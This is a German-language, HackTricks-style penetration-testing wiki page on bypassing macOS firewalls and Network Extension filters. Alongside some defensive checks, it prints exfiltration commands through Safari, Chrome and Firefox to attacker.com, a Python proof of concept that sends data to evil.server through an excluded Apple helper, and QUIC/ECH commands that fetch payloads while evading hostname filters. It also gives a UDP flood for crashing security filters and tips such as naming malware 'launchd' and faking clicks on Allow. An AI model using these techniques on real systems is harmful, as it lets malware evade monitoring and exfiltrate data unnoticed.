# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Gefundene Techniken

Die folgenden Techniken funktionierten in einigen macOS-Firewall-Apps.

### Abusing whitelist names

- Zum Beispiel die Malware unter Namen bekannter macOS-Prozesse wie **`launchd`** ausführen.

### Synthetic Click

- Wenn die Firewall den Benutzer um Erlaubnis bittet, lässt man die Malware **auf Allow klicken**.

### **Use Apple signed binaries**

- Zum Beispiel **`curl`**, aber auch andere wie **`whois`**

### Well known apple domains

Die Firewall könnte Verbindungen zu bekannten Apple-Domains wie **`apple.com`** oder **`icloud.com`** erlauben. Und iCloud könnte als C2 verwendet werden.

### Generic Bypass

Einige Ideen, um Firewalls zu umgehen

### Check allowed traffic

Das Wissen über den erlaubten Traffic hilft, potenziell whitelisted domains oder welche Anwendungen Zugriff darauf haben, zu identifizieren.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Missbrauch von DNS

DNS-Auflösungen werden über die signierte Anwendung **`mdnsreponder`** durchgeführt, die vermutlich berechtigt ist, DNS servers zu kontaktieren.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Über Browser-Apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

Wenn du **inject code into a process** kannst, der eine Verbindung zu beliebigen Servern herstellen darf, kannst du die Firewall-Schutzmaßnahmen umgehen:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Aktuelle macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
Im Juli 2024 hat Apple einen kritischen Fehler in Safari/WebKit behoben, der den systemweiten “Web content filter” unterbrach, der von Screen Time parental controls verwendet wird.
Eine speziell gestaltete URI (z. B. mit doppelt URL-encoded “://”) wird von der Screen Time ACL nicht erkannt, aber von WebKit akzeptiert, sodass die Anfrage unfiltriert gesendet wird. Jeder Prozess, der eine URL öffnen kann (einschließlich sandboxed oder unsigned code), kann daher Domains erreichen, die vom Benutzer oder einem MDM profile explizit blockiert wurden.

Praktischer Test (nicht gepatchtes System):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) Fehler in der Regelreihenfolge in frühen macOS 14 “Sonoma”
Während des macOS 14 Beta-Zyklus führte Apple eine Regression im Userspace-Wrapper um **`pfctl`** ein.
Regeln, die mit dem `quick`-Schlüsselwort hinzugefügt wurden (von vielen VPN kill-switches verwendet), wurden stillschweigend ignoriert, was zu Traffic leaks führte, selbst wenn eine VPN/Firewall-GUI *blockiert* meldete. Der Fehler wurde von mehreren VPN-Anbietern bestätigt und in RC 2 (build 23A344) behoben.

Schneller leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Ausnutzung von Apple-signierten Hilfsdiensten (veraltet – vor macOS 11.2)
Vor macOS 11.2 erlaubte die **`ContentFilterExclusionList`**, dass etwa 50 Apple-Binärdateien wie **`nsurlsessiond`** und der App Store alle socket-filter Firewalls umgehen konnten, die mit dem Network Extension framework implementiert wurden (LuLu, Little Snitch, etc.).
Malware konnte einfach einen ausgeschlossenen Prozess starten—oder Code in ihn injizieren—und ihren eigenen Netzwerkverkehr über den bereits erlaubten Socket tunneln. Apple hat die Ausschlussliste in macOS 11.2 vollständig entfernt, aber die Technik ist auf Systemen, die nicht aktualisiert werden können, weiterhin relevant.

Beispiel-Proof-of-Concept (vor 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH zur Umgehung von Network Extension Domain-Filtern (macOS 12+)
NEFilter Packet/Data Providers orientieren sich am TLS ClientHello SNI/ALPN. Bei **HTTP/3 over QUIC (UDP/443)** und **Encrypted Client Hello (ECH)** bleibt das SNI verschlüsselt, NetExt kann den Datenstrom nicht parsen, und Hostname-Regeln fallen häufig in einen fail-open-Zustand, sodass Malware gesperrte Domains erreichen kann, ohne DNS zu verwenden.

Minimales PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Wenn QUIC/ECH noch aktiviert ist, ist das ein einfacher Weg, hostname-filter zu umgehen.

### macOS 15 “Sequoia” Network Extension Instabilität (2024–2025)
Frühe 15.0/15.1‑Builds bringen Drittanbieter‑**Network Extension**‑Filter (LuLu, Little Snitch, Defender, SentinelOne, etc.) zum Absturz. Wenn der Filter neu startet, verwirft macOS seine flow rules und viele Produkte gehen fail‑open. Das Überfluten des Filters mit Tausenden kurzer UDP‑Flows (oder das Erzwingen von QUIC/ECH) kann den Absturz wiederholt auslösen und ein Zeitfenster für C2/exfil eröffnen, während die GUI weiterhin behauptet, die firewall laufe.

Quick reproduction (safe lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Tooling-Tipps für modernes macOS

1. Aktuelle PF-Regeln prüfen, die GUI-Firewalls erzeugen:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Binaries auflisten, die bereits das *outgoing-network* entitlement besitzen (nützlich zum Piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Programmgesteuert deinen eigenen Network Extension content filter in Objective-C/Swift registrieren.
Ein minimaler rootless PoC, der Pakete an einen lokalen Socket weiterleitet, ist im Quellcode von Patrick Wardle’s **LuLu** verfügbar.

## Referenzen

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
